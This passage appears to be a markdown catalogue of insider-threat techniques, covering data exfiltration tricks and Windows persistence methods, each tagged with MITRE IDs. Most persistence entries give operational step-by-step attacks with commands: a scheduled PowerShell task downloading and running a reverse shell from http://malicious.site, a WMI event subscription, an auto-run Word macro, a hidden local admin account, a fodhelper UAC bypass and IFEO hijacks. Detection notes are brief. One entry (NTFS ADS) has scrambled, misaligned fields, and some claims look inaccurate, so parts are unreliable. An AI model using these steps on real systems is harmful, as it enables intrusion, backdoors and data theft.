- **Target**: Network
- **Vulnerability**: SMTP not logged by content
- **MITRE**: T1041
- **Impact**: Bypasses outbound email restrictions
- **Tools**: Telnet, Email Script
- **Scenario**: Insider crafts SMTP commands using telnet or script to send data via corporate email server.
- **Attack Steps**: Step 1: Opens command prompt and connects to corp mail server.Step 2: Uses SMTP commands to “spoof” sending data to own Gmail.Step 3: Pastes sensitive info into message body.Step 4: Sends and closes session.Step 5: Deletes telnet history.
- **Detection**: SMTP command log
- **Solution**: Log SMTP raw commands, restrict relay
- **Tags**: #smtprelay #emailspoof

## PDF with Hidden Embedded Files

- **Attack Type**: File-Inside-File Trick
- **Target**: File
- **Vulnerability**: Embedded objects not scanned
- **MITRE**: T1566.001
- **Impact**: Sneaky multi-file exfiltration
- **Tools**: Adobe Acrobat, WinRAR
- **Scenario**: Insider embeds a ZIP file within a PDF that looks like a normal doc, avoiding DLP.
- **Attack Steps**: Step 1: Uses Acrobat to open regular report PDF.Step 2: Embeds a ZIP file containing confidential data as an attachment.Step 3: Emails PDF to personal account.Step 4: Attacker extracts ZIP from PDF.Step 5: Deletes temp files.
- **Detection**: PDF attachment scan
- **Solution**: Block embedded objects in PDFs
- **Tags**: #embeddedfile #pdfbypass

## Browser Translation Pop-up Trick

- **Attack Type**: On-Screen Rewriting
- **Target**: Web
- **Vulnerability**: Translation rewriting not blocked
- **MITRE**: T1036
- **Impact**: Cloaked data copy
- **Tools**: Chrome
- **Scenario**: Insider uses Chrome’s “Translate this page” feature to copy translated secure portal data into other language, evading DLP.
- **Attack Steps**: Step 1: Opens secure dashboard or internal report in browser.Step 2: Clicks “Translate this page” and selects “French”.Step 3: Copies translated content.Step 4: Pastes into Notepad and shares externally.Step 5: Clears browser translation history.
- **Detection**: Browser activity logs
- **Solution**: Block translate pop-ups, restrict GTranslate
- **Tags**: #translateleak #browsertrick

## Encoded Data Sent via DNS Tunnel

- **Attack Type**: Protocol Misuse
- **Target**: Network
- **Vulnerability**: DNS not inspected deeply
- **MITRE**: T1071.004 (DNS)
- **Impact**: Network bypass with covert channel
- **Tools**: DNSCat2, Command Line
- **Scenario**: Insider encodes files into DNS queries sent to attacker’s DNS server, bypassing HTTP DLP.
- **Attack Steps**: Step 1: Prepares files for tunneling using tool like DNSCat2.Step 2: Encodes sensitive data.Step 3: Sends DNS queries with embedded chunks of data.Step 4: Attacker receives them via their DNS server.Step 5: Reconstructs the file.
- **Detection**: DNS tunneling detection
- **Solution**: Deep packet inspection, DNS logging
- **Tags**: #dnstunnel #protocolbypass

## OCR Bypass via Scanned Handwritten Note

- **Attack Type**: Image Obfuscation
- **Target**: Image File
- **Vulnerability**: No OCR or handwriting detection
- **MITRE**: T1560.002
- **Impact**: Leaks text through images
- **Tools**: Paper, Scanner, Email
- **Scenario**: Insider writes sensitive info on paper, scans it as image, and emails it to bypass text-based DLP.
- **Attack Steps**: Step 1: Writes data (e.g., “Server IP: 192.168.1.1”) by hand.Step 2: Scans note using company scanner.Step 3: Saves it as JPEG named “Invoice_2025.jpg”.Step 4: Emails it to personal Gmail.Step 5: Deletes scanned file and history.
- **Detection**: Image-based DLP, OCR alerts
- **Solution**: Use OCR in DLP for images
- **Tags**: #ocrbypass #scannedleak

## Windows Narrator to Read Data Aloud

- **Attack Type**: Accessibility Tool Exploit
- **Target**: Accessibility
- **Vulnerability**: No logging of narrator use
- **MITRE**: T1123 (Audio Capture)
- **Impact**: Voice-exfil of visual data
- **Tools**: Windows Narrator, Mobile Recorder
- **Scenario**: Insider uses Narrator tool to read sensitive data aloud and records it via phone.
- **Attack Steps**: Step 1: Opens document on PC.Step 2: Turns on Windows Narrator from Ease of Access settings.Step 3: Highlights text for reading.Step 4: Records voice output on mobile.Step 5: Transcribes later.
- **Detection**: MDM monitoring of accessibility tools
- **Solution**: Restrict narrator/reader tools
- **Tags**: #accessibility #audiobypass

## Clipboard Hijack via Auto-Sync App

- **Attack Type**: Clipboard Sync Exploit
- **Target**: Endpoint
- **Vulnerability**: Clipboard sync not monitored
- **MITRE**: T1115
- **Impact**: Silent data transfer to mobile
- **Tools**: Pushbullet, KDE Connect
- **Scenario**: Insider uses app like Pushbullet or KDE Connect to sync clipboard to mobile phone.
- **Attack Steps**: Step 1: Copies text like passwords or code.Step 2: App auto-syncs clipboard to connected mobile.Step 3: Opens phone clipboard history.Step 4: Pastes it in messaging app.Step 5: Deletes clipboard logs.
- **Detection**: Monitor clipboard sync tools
- **Solution**: Block clipboard sync apps
- **Tags**: #clipboardsync #dlpbypass

## Using Recycle Bin as Drop Zone

- **Attack Type**: File Staging
- **Target**: File
- **Vulnerability**: Trash folder not monitored
- **MITRE**: T1074
- **Impact**: Delay-based exfiltration
- **Tools**: Recycle Bin, USB
- **Scenario**: Insider copies files to Recycle Bin folder as temporary holding area before final exfiltration.
- **Attack Steps**: Step 1: Copies sensitive files into Recycle Bin.Step 2: Waits for less monitoring time (e.g., lunch break).Step 3: Restores files and copies to USB.Step 4: Empties Recycle Bin.Step 5: Leaves with USB drive.
- **Detection**: Audit hidden folders, bin use
- **Solution**: Monitor Recycle Bin usage
- **Tags**: #recyclebin #filestage

## Auto-Sync Folder to External Drive

- **Attack Type**: Folder Sync Exploit
- **Target**: File System
- **Vulnerability**: USB sync folders not scanned
- **MITRE**: T1020
- **Impact**: Continuous, silent leaks
- **Tools**: SyncToy, USB Drive
- **Scenario**: Insider sets up auto-sync of confidential folder to USB/SD card plugged in regularly.
- **Attack Steps**: Step 1: Installs SyncToy or uses Windows task scheduler.Step 2: Configures folder “Reports2025” to sync to USB D: drive.Step 3: Inserts USB during lunch, triggers sync.Step 4: Removes USB stealthily.Step 5: Disables sync job.
- **Detection**: USB monitoring, sync job logs
- **Solution**: Block USB auto-sync & jobs
- **Tags**: #autosync #usbexfil

## Encoding Secrets in Image Pixels (Manual Pixel Stego)

- **Attack Type**: Visual Data Encoding
- **Target**: Image
- **Vulnerability**: No pixel stego detection
- **MITRE**: T1027.003
- **Impact**: Invisible data embed
- **Tools**: Paint.NET, Image Editor
- **Scenario**: Insider modifies pixels in an image file (e.g., single pixel color changes) to encode binary data.
- **Attack Steps**: Step 1: Opens photo file.Step 2: Changes pixel colors slightly (e.g., every 5th pixel encodes a binary value).Step 3: Saves image as JPEG.Step 4: Sends to attacker who decodes changes.Step 5: Deletes original image.
- **Detection**: Anomaly in image hash, stego scan
- **Solution**: Use stego-analysis tools
- **Tags**: #pixelstego #imagehide

## Exploiting Browser Cache for File Holding

- **Attack Type**: Cache Abuse
- **Target**: Browser
- **Vulnerability**: Cache not scanned by DLP
- **MITRE**: T1070.004
- **Impact**: Browser as stealth file store
- **Tools**: Chrome, File Explorer
- **Scenario**: Insider saves data in browser cache temporarily and accesses it on a different browser profile or device.
- **Attack Steps**: Step 1: Opens file in Chrome via file:/// URL.Step 2: Caches the file locally in browser cache.Step 3: Switches profile or plugs USB and opens cached path.Step 4: Copies file.Step 5: Deletes browser cache.
- **Detection**: Cache audit tools
- **Solution**: Clear cache on shutdown
- **Tags**: #browsercache #datalinger

## Using Fake Resume Generator for Data Masking

- **Attack Type**: Text Obfuscation
- **Target**: Web App
- **Vulnerability**: Form fields not inspected
- **MITRE**: T1036
- **Impact**: Masked data under legit UI
- **Tools**: Resume.com, Zety
- **Scenario**: Insider pastes sensitive info into “resume builder” sites, masking it as experience or skills.
- **Attack Steps**: Step 1: Opens online resume builder.Step 2: Adds “skills” like “db_password=admin123”.Step 3: Saves resume draft or exports PDF.Step 4: Sends it externally.Step 5: Deletes resume after use.
- **Detection**: Form field scanning, content monitor
- **Solution**: Block form sites, parse exported files
- **Tags**: #resumehack #textmasking

## Embedding Data in Audio File (Low-Freq Mod)

- **Attack Type**: Audio Stego
- **Target**: Audio File
- **Vulnerability**: No audio stego scan
- **MITRE**: T1027
- **Impact**: Hidden sound data exfil
- **Tools**: Audacity
- **Scenario**: Insider hides secret info in background noise or inaudible frequencies of MP3 file.
- **Attack Steps**: Step 1: Opens MP3 in Audacity.Step 2: Uses stego tool/plugin to embed secret data in sound.Step 3: Saves as “Training_Podcast.mp3”.Step 4: Uploads to cloud.Step 5: Attacker extracts using tool.
- **Detection**: Stego detection in audio
- **Solution**: Monitor MP3 uploads
- **Tags**: #audiostego #dlpbypass

## Using Hidden Excel Sheets for Exfil

- **Attack Type**: Workbook Manipulation
- **Target**: File
- **Vulnerability**: Hidden sheet not scanned
- **MITRE**: T1564.003
- **Impact**: Data exfil behind scenes
- **Tools**: Excel
- **Scenario**: Insider creates a hidden sheet in Excel with sensitive data while visible sheet is harmless.
- **Attack Steps**: Step 1: Opens Excel file and adds new sheet.Step 2: Types sensitive data in new sheet.Step 3: Right-clicks and hides the sheet.Step 4: Sends Excel file to outsider.Step 5: Deletes source file.
- **Detection**: Excel scan tools
- **Solution**: Auto-unhide and scan all sheets
- **Tags**: #excelhide #dlpbypass

## Hidden Scheduled Task Persistence

- **Attack Type**: Task Scheduler Abuse
- **Target**: Windows Workstation
- **Vulnerability**: Lack of visibility for hidden scheduled tasks
- **MITRE**: T1053.005 (Scheduled Task)
- **Impact**: Long-term system control
- **Tools**: Windows Task Scheduler, PowerShell
- **Scenario**: A malicious insider creates a hidden scheduled task to execute a script every time the system starts, maintaining persistence.
- **Attack Steps**: Step 1: Open the victim's computer (you are already inside as employee).Step 2: Press Win + R, type taskschd.msc, and press Enter to open Task Scheduler.Step 3: Click “Create Task” (not “Basic”) so you can access more options.Step 4: Name it something that seems legitimate, like “SystemUpdateCheck”.Step 5: Under the “Triggers” tab, add a new trigger with “At startup”.Step 6: Under the “Actions” tab, run your malicious script like powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\monitor.ps1.Step 7: Check “Hidden” under the “General” tab so users don’t see it.Step 8: Click OK. This task will now auto-run every time system boots.
- **Detection**: Audit logs, Task Scheduler viewer
- **Solution**: Disable hidden tasks, GPO restrictions
- **Tags**: persistence, scheduled-task, insider

## Registry Run Key Abuse

- **Attack Type**: Registry Persistence
- **Target**: Windows Registry
- **Vulnerability**: Registry auto-run keys exposed
- **MITRE**: T1547.001 (Registry Run Keys)
- **Impact**: Stealth backdoor on login
- **Tools**: regedit, PowerShell
- **Scenario**: Insider adds a registry entry to run a malicious program every time any user logs in.
- **Attack Steps**: Step 1: Press Win + R, type regedit, press Enter to open Registry Editor.Step 2: Navigate to HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run.Step 3: Right-click in the right pane and choose “New” > “String Value”.Step 4: Name it “SystemServiceMonitor”.Step 5: Double-click it and paste the path to your script or app (e.g., C:\Users\Public\stealthapp.exe).Step 6: Close regedit. The app will run every login.
- **Detection**: Registry monitoring tools
- **Solution**: Harden registry access, AppLocker
- **Tags**: persistence, registry, non-admin insider

## Office Macro Backdoor

- **Attack Type**: Document Payload
- **Target**: Shared Document Server
- **Vulnerability**: Macros enabled by default
- **MITRE**: T1059.005 (Command & Scripting via Office Macros)
- **Impact**: Remote script execution on user device
- **Tools**: MS Word, VBA, PowerShell
- **Scenario**: A malicious insider creates a Word document with macros and stores it on a shared drive. When opened, it establishes persistence via script execution.
- **Attack Steps**: Step 1: Open MS Word, create a new document.Step 2: Press Alt + F11 to open the macro editor.Step 3: Paste a macro like:Sub AutoOpen()Shell "powershell.exe -ExecutionPolicy Bypass -File \\shared\payload.ps1"End SubStep 4: Save the document as .docm (Macro-enabled).Step 5: Upload to a team-shared folder with a tempting name like “Q3_Bonus_Sheet.docm”.Step 6: When a colleague opens it, the macro runs silently in background.
- **Detection**: AV alerts, macro blocking
- **Solution**: Macro security, disable macros via GPO
- **Tags**: office, macro, insider, persistence

## Startup Folder Exploit

- **Attack Type**: File Drop Persistence
- **Target**: Windows Filesystem
- **Vulnerability**: Write access to Startup folder
- **MITRE**: T1547.001 (Startup Items)
- **Impact**: Code execution at every login
- **Tools**: File Explorer, EXE or Batch Script
- **Scenario**: Insider places a malicious file in another user's startup folder so it runs at each login.
- **Attack Steps**: Step 1: Press Win + R, type shell:startup and hit Enter. This opens your own Startup folder.Step 2: Go to C:\Users\<TargetUser>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.Step 3: Drop your malicious file here (e.g., funnywallpaper.exe).Step 4: When the target logs in next, the file runs automatically.Step 5: Use a misleading name to avoid suspicion (e.g., Adobe_Updater.exe).
- **Detection**: File access monitoring
- **Solution**: Folder permissions, restrict Startup write access
- **Tags**: startup, persistence, insider

## WMI Event Subscription Abuse

- **Attack Type**: WMI Persistence
- **Target**: Windows WMI
- **Vulnerability**: WMI subscriptions rarely audited
- **MITRE**: T1084 (WMI Event Subscription)
- **Impact**: Hidden and durable code execution
- **Tools**: PowerShell, WMI
- **Scenario**: Insider creates a permanent WMI event that triggers execution of malware under certain conditions (e.g., user idle).
- **Attack Steps**: Step 1: Open PowerShell as administrator.Step 2: Run this command:$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='IdleTrigger';EventNamespace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM Win32_PerfFormattedData_PerfOS_System WHERE SystemUpTime > 300"}  Step 3: Create consumer:$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='IdleExec';CommandLineTemplate='powershell.exe -ExecutionPolicy Bypass -File C:\Payload\malware.ps1'}Step 4: Bind them:Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer}Step 5: Now, malware runs silently when uptime > 5 mins.
- **Detection**: Sysmon, WMI audit logs
- **Solution**: Disable WMI for non-admins, log subscriptions
- **Tags**: wmi, stealth, insider

## DLL Hijacking via Trusted Application

- **Attack Type**: DLL Hijack
- **Target**: Windows Application
- **Vulnerability**: Insecure DLL load order
- **MITRE**: T1574.001 (DLL Search Order Hijacking)
- **Impact**: Code execution through trusted apps
- **Tools**: Dependency Walker, Visual Studio, File Explorer
- **Scenario**: Insider replaces a trusted DLL file used by a company app with a malicious DLL to gain persistent access.
- **Attack Steps**: Step 1: Find a trusted application used in the company (e.g., AppX.exe).Step 2: Use "Dependency Walker" to list all DLLs that app loads.Step 3: Identify one DLL that loads from app directory (e.g., Logger.dll).Step 4: Rename your malicious DLL as Logger.dll.Step 5: Replace the original DLL in the same folder where AppX.exe is installed.Step 6: Now, whenever the app runs, your DLL executes first and stays persistent.
- **Detection**: Application behavior monitoring
- **Solution**: Digital signature validation, restricted folders
- **Tags**: dll, hijack, insider, persistence

## Windows Service Creation

- **Attack Type**: Rogue Service
- **Target**: Windows OS
- **Vulnerability**: Admins can create services
- **MITRE**: T1543.003 (Create or Modify System Process - Windows Service)
- **Impact**: Persistent and silent execution
- **Tools**: PowerShell, SC.exe
- **Scenario**: Insider creates a new Windows service that starts on boot to execute a malicious program.
- **Attack Steps**: Step 1: Open PowerShell as admin.Step 2: Create a new service:sc.exe create "SysUpdateSvc" binPath= "C:\malicious\spy.exe" start= autoStep 3: The service is now installed and will auto-start on reboot.Step 4: You can check it under Services panel (services.msc).
- **Detection**: Service audit logs
- **Solution**: Restrict service creation to admins only
- **Tags**: windows-service, persistence

## Hidden VBS Script in Startup

- **Attack Type**: File Drop
- **Target**: Windows
- **Vulnerability**: Lack of script auditing in Startup
- **MITRE**: T1059.005 (VBS Execution)
- **Impact**: Background info exfiltration
- **Tools**: Notepad, File Explorer
- **Scenario**: Insider creates a .vbs file that runs silently and places it in the startup folder.
- **Attack Steps**: Step 1: Open Notepad and type:Set WshShell = CreateObject("WScript.Shell")WshShell.Run "powershell.exe -windowstyle hidden -File C:\payload\steal.ps1", 0Step 2: Save it as winupdate.vbs.Step 3: Move it to the target's startup folder: C:\Users\Target\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.Step 4: It runs silently every time the user logs in.
- **Detection**: Script path monitoring
- **Solution**: Disable script engines, restrict folder access
- **Tags**: startup, vbs, persistence

## Outlook Rules + Script

- **Attack Type**: Email-Based Trigger
- **Target**: Email Client
- **Vulnerability**: Rule-based auto-execution
- **MITRE**: T1564.008 (Email Auto-forwarding Rule Abuse)
- **Impact**: Remote-triggered execution
- **Tools**: Outlook, PowerShell, VBScript
- **Scenario**: Insider uses Outlook rules to trigger a script every time a specific email arrives.
- **Attack Steps**: Step 1: Open Outlook, go to Rules > Manage Rules & Alerts.Step 2: Create a new rule: “When mail arrives from attacker@example.com”.Step 3: Action: Run a script (malicious_script.vbs).Step 4: Write this VBS to launch PowerShell silently:CreateObject("Wscript.Shell").Run "powershell -ExecutionPolicy Bypass -File C:\hidden\backdoor.ps1",0Step 5: Save and enable rule. Script triggers each time email is received.
- **Detection**: Email flow monitoring
- **Solution**: Disable script triggers in email clients
- **Tags**: outlook, persistence, insider

## Local Admin Account Backdoor

- **Attack Type**: Account Persistence
- **Target**: Windows User Management
- **Vulnerability**: Weak account audit policies
- **MITRE**: T1136.001 (Create Account)
- **Impact**: Stealthy backdoor access
- **Tools**: CMD, PowerShell
- **Scenario**: Insider creates a hidden local admin account that provides long-term access.
- **Attack Steps**: Step 1: Open CMD as admin.Step 2: Create a hidden user:net user supportsvc P@ssword123 /addStep 3: Add to Administrators group:net localgroup administrators supportsvc /addStep 4: Hide user from login screen:In Regedit, go to HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList, add DWORD supportsvc = 0.Step 5: Now you have admin access even if your main account is deleted.
- **Detection**: User list auditing, login event tracking
- **Solution**: Monitor for unauthorized admin users
- **Tags**: insider, useraccount, persistence

## COM Hijacking for Persistence

- **Attack Type**: COM Object Abuse
- **Target**: COM Objects
- **Vulnerability**: COM loading not validated
- **MITRE**: T1546.015 (Component Object Model Hijacking)
- **Impact**: Invisible execution hijack
- **Tools**: Regedit, PowerShell
- **Scenario**: Insider hijacks a COM object entry to redirect execution to malicious binary.
- **Attack Steps**: Step 1: Press Win + R, type regedit, Enter.Step 2: Navigate to HKCU\Software\Classes\CLSID\{GUID} for some common COM GUID.Step 3: Modify the default value to point to C:\malicious\backdoor.exe.Step 4: Now when this COM object is called (e.g., by another app), your code runs instead.Step 5: This change stays across reboots and is stealthy.
- **Detection**: COM CLSID monitoring
- **Solution**: AppLocker, registry permission hardening
- **Tags**: com, hijack, registry, insider

## Persistence via RunOnceEx

- **Attack Type**: Registry Abuse
- **Target**: Windows Registry
- **Vulnerability**: Boot-time registry persistence
- **MITRE**: T1547.001 (RunOnce Keys)
- **Impact**: Boot-time code injection
- **Tools**: regedit
- **Scenario**: Insider abuses the RunOnceEx registry key to auto-run payloads on next boot.
- **Attack Steps**: Step 1: Press Win + R, type regedit, press Enter.Step 2: Navigate to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx.Step 3: Right-click, create a new key 900.Step 4: Inside 900, create a string value Title = “System Setup”.Step 5: Add another value 1 = powershell.exe -File C:\payload\start.ps1.Step 6: On next boot, this payload executes before desktop loads.
- **Detection**: Registry forensics
- **Solution**: Disable RunOnceEx usage via GPO
- **Tags**: registry, boot, insider

## Abusing Windows Error Reporting

- **Attack Type**: Application Abuse
- **Target**: Windows WER
- **Vulnerability**: Lack of visibility in WER
- **MITRE**: T1546.007 (Crash Handler Hijack)
- **Impact**: Unexpected persistence via error mechanism
- **Tools**: Registry, Custom EXE
- **Scenario**: Insider creates a fake crash handler so their malware is executed when a crash occurs.
- **Attack Steps**: Step 1: Open regedit, go to HKLM\Software\Microsoft\Windows\Windows Error Reporting\LocalDumps.Step 2: Set DumpFolder to point to malware folder.Step 3: Set DumpCount = 10, DumpType = 2.Step 4: Now, whenever an app crashes, your payload in that folder executes as a response.Step 5: Force crash a process to verify.
- **Detection**: Dump folder analysis
- **Solution**: WER GPO enforcement, folder isolation
- **Tags**: crash-handler, persistence, insider

## Scheduled Task via Group Policy Folder

- **Attack Type**: GPO Abuse
- **Target**: Windows Domain
- **Vulnerability**: Weak GPO folder ACLs
- **MITRE**: T1053.005 (Scheduled Task)
- **Impact**: Organization-wide persistence
- **Tools**: GPO Shared Folder, XML Task Template
- **Scenario**: Insider copies a scheduled task XML to a shared GPO location, triggering task on multiple systems.
- **Attack Steps**: Step 1: Export a scheduled task as XML using Task Scheduler.Step 2: Modify it to execute C:\malicious\remote_access.exe.Step 3: Save it as UpdateTask.xml.Step 4: Copy it to \\domain.local\SYSVOL\scripts\Tasks\UpdateTask.xml.Step 5: Now every system with GPO sync will load this task.
- **Detection**: GPO logs, task auditing
- **Solution**: Harden SYSVOL access, GPO task control
- **Tags**: gpo, domain, insider, persistence

## Persistence via Print Spooler Abuse

- **Attack Type**: Service Abuse
- **Target**: Print Spooler
- **Vulnerability**: DLL auto-load on service restart
- **MITRE**: T1547.012 (Print Spooler)
- **Impact**: Exploit service behavior for persistence
- **Tools**: SMB, DLL
- **Scenario**: Insider uploads malicious DLL to print spooler folder, hijacking the service.
- **Attack Steps**: Step 1: Identify the print spool folder (e.g., C:\Windows\System32\spool\drivers\x64\3).Step 2: Copy your malicious DLL (e.g., printjob.dll) into that folder.Step 3: Restart the spooler service: net stop spooler && net start spooler.Step 4: The service loads the DLL and runs your code persistently.
- **Detection**: Spooler log analysis
- **Solution**: Disable spooler on endpoints
- **Tags**: dll, print, service abuse, insider

## Persistence via Hidden LNK Shortcut

- **Attack Type**: Shortcut Hijack
- **Target**: Windows Filesystem
- **Vulnerability**: LNK files often trusted
- **MITRE**: T1204.002 (Malicious File)
- **Impact**: Social engineering-based persistence
- **Tools**: File Explorer, Notepad
- **Scenario**: Insider creates a malicious shortcut (.lnk) and replaces an existing one on the user's desktop or startup folder.
- **Attack Steps**: Step 1: Create a shortcut to cmd.exe.Step 2: Right-click > Properties > in “Target”, change it to:cmd.exe /c start powershell -ExecutionPolicy Bypass -File C:\malware\run.ps1Step 3: Change the icon to a normal-looking app (e.g., Word or Excel).Step 4: Rename the shortcut as MS Word 2024.lnk.Step 5: Place it on user’s desktop or in shell:startup folder.Step 6: When clicked or on login, the hidden script is executed.
- **Detection**: File hash scans
- **Solution**: Use only signed, validated shortcuts
- **Tags**: lnk, shortcut, insider, persistence

## Winlogon Shell Modification

- **Attack Type**: Registry Persistence
- **Target**: Windows Registry
- **Vulnerability**: Shell key manipulation
- **MITRE**: T1547.004 (Winlogon Helper DLL)
- **Impact**: Persistent login-time execution
- **Tools**: Regedit
- **Scenario**: Insider modifies Winlogon shell key to launch malware alongside Explorer.
- **Attack Steps**: Step 1: Open regedit and go to:HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinlogonStep 2: Find Shell entry. Default is explorer.exe.Step 3: Change value to:explorer.exe, C:\malicious\runme.exeStep 4: Now, on login, both Explorer and your malware will launch.Step 5: The malware stays active every time user logs in.
- **Detection**: Shell value audit
- **Solution**: Enforce shell integrity via GPO
- **Tags**: winlogon, registry, insider

## Persistent PowerShell Profile Backdoor

- **Attack Type**: Scripting Persistence
- **Target**: PowerShell Profile
- **Vulnerability**: Auto-execution on shell open
- **MITRE**: T1059.001 (PowerShell)
- **Impact**: Persistent script execution
- **Tools**: Notepad, PowerShell
- **Scenario**: Insider modifies the PowerShell profile script so malicious code runs when PowerShell is opened.
- **Attack Steps**: Step 1: Navigate to:C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1Step 2: If file doesn’t exist, create it.Step 3: Add this line:Invoke-Expression (Get-Content C:\malicious\back.ps1)Step 4: Save and close. Now anytime PowerShell is opened, back.ps1 is executed silently.Step 5: Can be used to maintain reverse shell or keylogger.
- **Detection**: Profile file scans
- **Solution**: Restrict PowerShell profiles
- **Tags**: powershell, script, insider

## Persistence via Image File Execution Options (IFEO)

- **Attack Type**: Debugger Hijack
- **Target**: Registry (IFEO)
- **Vulnerability**: Hijack via Debugger key
- **MITRE**: T1546.012 (IFEO Injection)
- **Impact**: Tool hijack and stealth
- **Tools**: Regedit
- **Scenario**: Insider uses IFEO in registry to hijack normal programs (e.g., Task Manager) to run malware instead.
- **Attack Steps**: Step 1: Go to:HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Taskmgr.exeStep 2: Add new String value: DebuggerStep 3: Set value to: C:\malicious\fake.exeStep 4: Now, whenever Task Manager is opened, fake.exe runs instead.Step 5: This is often used to block or hijack security tools.
- **Detection**: IFEO key audits
- **Solution**: Monitor registry for IFEO keys
- **Tags**: ifeo, registry, insider

## Persistent Reverse Shell via Task Scheduler

- **Attack Type**: Scheduled Task
- **Target**: Task Scheduler
- **Vulnerability**: Long-lived recurring job
- **MITRE**: T1053.005 (Scheduled Task)
- **Impact**: Persistent C2 shell access
- **Tools**: PowerShell, Task Scheduler
- **Scenario**: Insider schedules a PowerShell reverse shell to execute repeatedly every 15 minutes.
- **Attack Steps**: Step 1: Open PowerShell.Step 2: Run:$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(''http://malicious.site/shell.ps1'')"'<br>$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration ([TimeSpan]::MaxValue)<br>Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemUpdate"Step 3: A reverse shell now runs silently every 15 mins.
- **Detection**: Scheduler logs
- **Solution**: Block outbound C2, monitor tasks
- **Tags**: reverse-shell, scheduled, insider

## Abusing Logon Scripts via Group Policy

- **Attack Type**: GPO Abuse
- **Target**: Active Directory / GPO
- **Vulnerability**: GPO not audited properly
- **MITRE**: T1037.001 (Logon Scripts)
- **Impact**: Cross-user persistent execution
- **Tools**: GPMC, Script Editor
- **Scenario**: Insider modifies GPO logon scripts to execute malicious payloads across user logins.
- **Attack Steps**: Step 1: Open Group Policy Editor (GPMC).Step 2: Edit existing GPO applied to users (e.g., Default Domain Policy).Step 3: Go to User Config > Windows Settings > Scripts (Logon).Step 4: Add a script path: \\domain.local\netlogon\evil.batStep 5: Place evil.bat on that shared location to execute reverse shell or downloader.
- **Detection**: GPO change logs
- **Solution**: Enforce script signing, GPO restrictions
- **Tags**: gpo, logon, insider

## UAC Bypass via FodHelper.exe

- **Attack Type**: Privilege Escalation & Persistence
- **Target**: Windows UAC Mechanism
- **Vulnerability**: Fodhelper UAC loophole
- **MITRE**: T1548.002 (Bypass User Account Control)
- **Impact**: Elevated persistent execution
- **Tools**: Regedit, fodhelper.exe
- **Scenario**: Insider uses fodhelper.exe to bypass UAC and execute malware without prompts.
- **Attack Steps**: Step 1: In regedit, go to:HKCU\Software\Classes\ms-settings\Shell\Open\commandStep 2: Set (Default) value to:powershell.exe -ExecutionPolicy Bypass -File C:\malicious\runme.ps1Step 3: Add a String value DelegateExecute with empty data.Step 4: Press Win + R, type fodhelper.exe, and hit enter.Step 5: Your script now runs with high privileges silently.
- **Detection**: ProcMon, UAC bypass alerts
- **Solution**: Disable fodhelper UAC trick via registry
- **Tags**: uac, bypass, insider, persistence

## Persistence via Environment Variable Hijack

- **Attack Type**: Path Hijack
- **Target**: User Profile / PATH
- **Vulnerability**: PATH not sanitized
- **MITRE**: T1574.009 (Path Interception)
- **Impact**: Malicious program execution
- **Tools**: CMD, Env Editor
- **Scenario**: Insider changes user environment variable PATH to prioritize malicious binaries.
- **Attack Steps**: Step 1: Open System Properties > Environment Variables.Step 2: Under “User variables”, edit PATH.Step 3: Add C:\malicious\bin to the start of PATH.Step 4: Place a fake version of common tools (e.g., notepad.exe, ping.exe) in this folder.Step 5: When user runs those tools, malicious versions execute.
- **Detection**: PATH integrity audit
- **Solution**: Restrict PATH edits, hash-check binaries
- **Tags**: path, hijack, insider

## Persistence via Taskbar Pinned Shortcut

- **Attack Type**: GUI Hijack
- **Target**: Windows Desktop
- **Vulnerability**: Misleading icon + shortcut
- **MITRE**: T1036.005 (Masquerading: Match Legitimate Name or Location)
- **Impact**: User-triggered persistence
- **Tools**: File Explorer, Shortcut Maker
- **Scenario**: Insider creates a malicious shortcut and pins it to taskbar to look like a system app.
- **Attack Steps**: Step 1: Create a new shortcut targeting:powershell.exe -WindowStyle hidden -File C:\malicious\run.ps1Step 2: Change icon to “Chrome” or “Edge”.Step 3: Rename as “Google Chrome”.Step 4: Right-click and “Pin to Taskbar”.Step 5: Victim will click expecting browser but malware executes.
- **Detection**: Shortcut file review
- **Solution**: Block user shortcut creation to protected locations
- **Tags**: pinned-shortcut, gui, insider

## Persistent NTFS Alternate Data Stream

- **Attack Type**: Hidden File Abuse
- **Target**: iex"`Step 4: Add this execution to login script or scheduled task.Step 5: File looks clean, but hidden code stays persistent.
- **Vulnerability**: NTFS Filesystem
- **MITRE**: ADS not commonly scanned
- **Impact**: T1564.004 (NTFS ADS)
- **Tools**: CMD, PowerShell
- **Scenario**: Insider hides malware in Alternate Data Stream (ADS) so antivirus doesn’t detect it, and triggers via script.
- **Attack Steps**: Step 1: Open CMD.Step 2: Create a fake file:echo Malicious code > normal.txt:hiddenfile.ps1Step 3: To execute it:`powershell.exe -ExecutionPolicy Bypass -Command "Get-Content .\normal.txt:hiddenfile.ps1
- **Detection**: Hidden script runs undetected
- **Solution**: Use forensic tools like Streams
- **Tags**: Block ADS via AV, log ADS access

## Persistence via Chrome Extension

- **Attack Type**: Browser Extension Abuse
- **Target**: Web Browser
- **Vulnerability**: Extension permissions not reviewed
- **MITRE**: T1176 (Browser Extensions)
- **Impact**: Persistent browser-level spying
- **Tools**: Chrome Developer Mode
- **Scenario**: Insider installs a malicious Chrome extension with background script to steal data and persist across sessions.
